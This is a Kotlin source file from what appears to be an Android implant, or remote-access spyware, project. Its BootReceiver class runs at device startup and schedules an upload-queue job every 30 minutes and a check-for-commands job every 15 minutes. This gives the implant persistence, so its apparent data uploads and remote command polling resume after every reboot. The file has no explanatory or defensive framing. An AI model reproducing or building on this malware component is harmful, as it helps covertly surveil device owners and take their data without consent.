package com.cooperthecoder.implant

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.cooperthecoder.implant.jobs.CheckForCommandsJob
import com.cooperthecoder.implant.jobs.JobManager
import com.cooperthecoder.implant.jobs.UploadQueueJob
import java.util.concurrent.TimeUnit

class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        JobManager.schedule(UploadQueueJob.JOB_NAME, TimeUnit.MINUTES.toMillis(30))
        JobManager.schedule(CheckForCommandsJob.JOB_NAME, TimeUnit.MINUTES.toMillis(15))
    }
}

